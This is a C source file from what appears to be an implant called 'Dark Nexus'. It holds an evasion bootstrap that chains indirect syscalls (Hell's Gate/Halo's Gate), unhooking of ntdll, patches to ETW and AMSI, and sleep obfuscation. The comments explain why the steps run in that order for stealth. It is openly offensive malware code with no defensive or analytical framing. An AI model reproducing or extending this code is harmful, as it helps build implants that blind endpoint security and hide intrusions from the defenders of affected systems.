#include "evasion.h"

/*
 * Dark Nexus - Evasion Layer Bootstrap
 *
 * Orchestrates the initialization of all evasion modules
 * in the correct dependency order. Each step builds on
 * the previous:
 *
 *   Syscalls -> Unhook -> ETW patch -> AMSI patch
 *
 * Syscalls must be first because unhooking and patching
 * can optionally use the indirect syscall path.
 * Unhooking must come before ETW/AMSI patching because
 * the patches modify ntdll/amsi, and we want a clean
 * ntdll before we start patching (otherwise we might
 * be patching already-hooked stubs).
 *
 * Failures are non-fatal: each module reports its status
 * independently. The implant can operate with partial
 * evasion (e.g., syscalls work but unhooking failed).
 */

DN_EVASION_STATUS dn_evasion_init(void) {
    DN_EVASION_STATUS status = {0};

    // Step 1: Initialize syscall engine
    // Extracts SSNs via Hell's Gate / Halo's Gate
    // Finds 'syscall; ret' gadget for indirect invocation
    status.syscalls_ready = dn_syscalls_init();

    // Step 2: Unhook ntdll.dll
    // Restores the .text section from a clean copy
    // Three strategies in stealth order (KnownDlls -> suspended -> disk)
    status.ntdll_unhooked = dn_unhook_ntdll();

    // Step 3: Patch ETW and AMSI
    // ETW first (suppress events before AMSI loading generates them)
    status.total_patches = dn_patch_all();
    status.etw_patched  = (status.total_patches >= 1);
    status.amsi_patched = (status.total_patches >= 2);

    // Step 4: Initialize sleep obfuscation
    // Captures image base/text section info and resolves SystemFunction032
    // Must come after syscalls init (uses DnNtProtectVirtualMemory)
    status.sleep_ready = dn_sleep_init();

    return status;
}
